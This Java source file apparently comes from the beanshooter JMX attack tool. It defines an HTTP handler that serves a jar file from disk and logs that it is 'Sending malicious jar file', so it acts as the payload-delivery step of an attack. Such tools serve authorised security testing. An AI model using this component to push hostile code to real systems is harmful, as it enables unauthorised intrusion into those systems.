package de.qtc.beanshooter.utils;

import java.io.IOException;
import java.io.OutputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;


public class JarHandler implements HttpHandler {

    String jarName = null;
    String jarPath = null;

    public JarHandler(String jarName, String jarPath) 
    {
        this.jarName = jarName;
        this.jarPath = jarPath;
    }
     
    private byte[] readJar(String jarPath, String jarName) throws IOException
    {
        Path jarPath_ = Paths.get(jarPath + "/" + jarName);
        byte[] bytearray = Files.readAllBytes(jarPath_);
        return bytearray;
    }

    public void handle(HttpExchange t) throws IOException 
    {
        String requestURL = t.getRequestURI().toString();
        System.out.println("[+] \tReceived request for " + requestURL);

        byte[] jarContent = this.readJar(this.jarPath, this.jarName);
        System.out.print("[+] \tSending malicious jar file... ");

        t.sendResponseHeaders(200, jarContent.length);
        OutputStream os = t.getResponseBody();
        os.write(jarContent,0,jarContent.length);
        os.close();

        System.out.println("done!\n[+]");
    }
}
